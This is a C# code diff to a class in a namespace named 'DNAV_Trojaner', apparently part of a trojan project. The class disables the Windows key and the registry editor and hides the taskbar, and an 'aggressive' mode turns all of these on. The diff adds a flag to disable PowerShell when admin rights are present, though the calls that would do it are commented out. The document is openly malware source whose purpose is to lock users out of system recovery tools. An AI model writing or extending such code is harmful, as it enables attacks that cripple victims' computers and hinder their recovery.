@@ -26,6 +26,7 @@ namespace DNAV_Trojaner
         private bool _disableWindowsKey;
         private bool _disableRegEdit;
         private bool _hideTaskbar;
+        private bool _disablePowershell;
 
         private bool checkAdmin()
         {
@@ -230,6 +231,21 @@ namespace DNAV_Trojaner
         }
 
         /// <summary>
+        /// Legt fest, ob die Powershell deaktiviert werden soll.
+        /// </summary>
+        public bool DisablePowershell
+        {
+            get
+            {
+                return this._disablePowershell;
+            }
+            set
+            {
+                this._disablePowershell = value;
+            }
+        }
+
+        /// <summary>
         /// Erstellt ein Objekt der DNAV Klasse mit Standardparametern.
         /// </summary>
         public DNAV()
@@ -248,6 +264,7 @@ namespace DNAV_Trojaner
             this.DisableWindowsKey = false;
             this.DisableRegEdit = false;
             this.HideTaskbar = false;
+            this.DisablePowershell = false;
         }
 
         /// <summary>
@@ -269,6 +286,7 @@ namespace DNAV_Trojaner
             this.DisableWindowsKey = aggressive;
             this.DisableRegEdit = aggressive;
             this.HideTaskbar = aggressive;
+            this.DisablePowershell = aggressive;
         }
 
         /// <summary>
@@ -322,6 +340,11 @@ namespace DNAV_Trojaner
             if (this.HideTaskbar)
             {
                 Taskbar.Hide();
+            }
+            if (this.DisablePowershell && this._isAdmin)
+            {
+                //Powershell.Disable();
+                //Powershell.DisableRoot();
             }
         }
     }
